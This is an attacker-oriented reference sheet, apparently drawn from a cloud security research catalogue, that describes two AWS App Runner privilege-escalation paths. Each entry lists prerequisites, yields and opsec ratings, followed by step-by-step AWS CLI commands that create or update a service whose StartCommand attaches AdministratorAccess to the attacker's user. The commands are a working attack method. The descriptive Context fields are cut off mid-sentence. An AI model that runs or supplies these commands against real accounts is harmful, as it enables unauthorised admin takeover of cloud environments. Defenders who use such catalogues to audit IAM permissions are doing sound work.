# AppRunner - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + apprunner:CreateService [added: 2026-04]
- **Tags:** #Iam #Apprunner #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + apprunner service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, apprunner:CreateService; A role must exist that trusts tasks.apprunner.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [apprunner-001] A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged IAM role attached. The service runs with the attached role's permissions, and the attacker has multiple ways to leverage these permissions. They can configure a StartCommand to execute AWS CLI commands when the service starts, deploy a container with a web shell or reverse shell to 
- **Payload/Method:**
```
# Step 1: Verify your current identity and note your username for the next step
aws sts get-caller-identity

# Step 2: Create an App Runner service using the public AWS CLI image with a StartCommand that grants admin access to your user
aws apprunner create-service \
  --service-name privesc-service \
  --source-configuration '{
    "ImageRepository": {
      "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
      "ImageRepositoryType": "ECR_PUBLIC",
      "ImageConfiguration": {
        "Port": "8080",
        "StartCommand": "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
      }
    },
    "AutoDeploymentsEnabled": false
  }' \
  --instance-configuration '{
    "Cpu": "1 vCPU",
    "Memory": "2 GB",
    "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
  }'

# Step 3: Wait for the service to reach 'RUNNING' status (may take 3-5 minutes). The StartCommand executes when the service starts
aws apprunner describe-service --service-arn SERVICE_ARN --query 'Service.Status'

# Step 4: Wait 15 seconds for IAM policy changes to propagate
sleep 15

# Step 5: Verify administrator access by listing IAM users (should now succeed)
aws iam list-users --max-items 3
```

### apprunner:UpdateService [added: 2026-04]
- **Tags:** #Apprunner #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; apprunner in scope
- **Prereq:** IAM perms: apprunner:UpdateService; An App Runner service must exist with an IAM role attached
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [apprunner-002] A principal with `apprunner:UpdateService` can modify an existing App Runner service's configuration. If the target service has a privileged IAM role attached, the attacker can update the service to leverage the attached role's permissions. They have multiple ways to exploit this, including configuring a StartCommand to execute AWS CLI commands when the service redeploys, updating to a container i
- **Payload/Method:**
```
# Step 1: List existing App Runner services to find targets with privileged roles
aws apprunner list-services

# Step 2: Check the service's instance role ARN to confirm elevated permissions and note the current port configuration
aws apprunner describe-service --service-arn SERVICE_ARN

# Step 3: Verify your current identity and note your username for the next step
aws sts get-caller-identity

# Step 4: Update the service to use the public AWS CLI image with a StartCommand that grants admin access to your user
aws apprunner update-service \
  --service-arn SERVICE_ARN \
  --source-configuration '{
    "ImageRepository": {
      "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
      "ImageRepositoryType": "ECR_PUBLIC",
      "ImageConfiguration": {
        "Port": "CURRENT_PORT",
        "StartCommand": "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
      }
    },
    "AutoDeploymentsEnabled": false
  }'

# Step 5: Wait for the service to complete redeployment and reach 'RUNNING' status (may take 3-5 minutes). The StartCommand execut
aws apprunner describe-service --service-arn SERVICE_ARN --query 'Service.Status'
```
